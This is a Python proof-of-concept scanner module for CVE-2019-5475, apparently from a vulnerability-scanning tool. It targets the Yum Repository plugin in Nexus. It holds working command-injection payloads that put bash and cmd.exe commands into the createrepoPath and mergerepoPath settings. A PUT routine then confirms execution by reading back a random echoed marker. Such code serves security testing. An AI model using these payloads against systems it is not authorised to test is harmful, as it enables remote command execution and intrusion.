#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2019_5475_payloads = [
    # * "key":"createrepoPath"
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"bash -c $@|bash 0 echo echo RCEMD &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"/bin/bash -c $@|bash 0 echo echo RCEMD &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"cmd.exe /c echo/RCEMD &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:/Windows/System32/cmd.exe /c echo/RCEMD &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo/RCEMD &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    # * "key":"mergerepoPath"
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"bash -c $@|bash 0 echo echo RCEMD &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"/bin/bash -c $@|bash 0 echo echo RCEMD &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"cmd.exe /c echo/RCEMD &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:/Windows/System32/cmd.exe /c echo/RCEMD &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
    {'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo/RCEMD &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'},
]

def cve_2019_5475_scan(self, clients):
    ''' Nexus内置插件Yum Repository的RCE命令注入漏洞, 其最早被披露于Hackerone '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2019-5475',
    }

    headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Nexus-UI': 'true',
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
        'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json',
    }

    # todo 尝试获取Yum: Configuration相应的id路径, 如果没有找到yum_id路径, 则退出当前POC
    path = self.get_yumID(client, vul_info)
    if not path:
        return

    for payload in cve_2019_5475_payloads:
        random_str = random_md5(6)
        
        data = payload['data'].replace('RCEMD', random_str)

        res2 = client.request(
            'put',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue
        
        if ((check.check_res(res2.text, ' echo '+random_str))
            or (check.check_res(res2.text, random_str))
        ):
            results = {
                'Target': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res2
            }
            return results
    return None
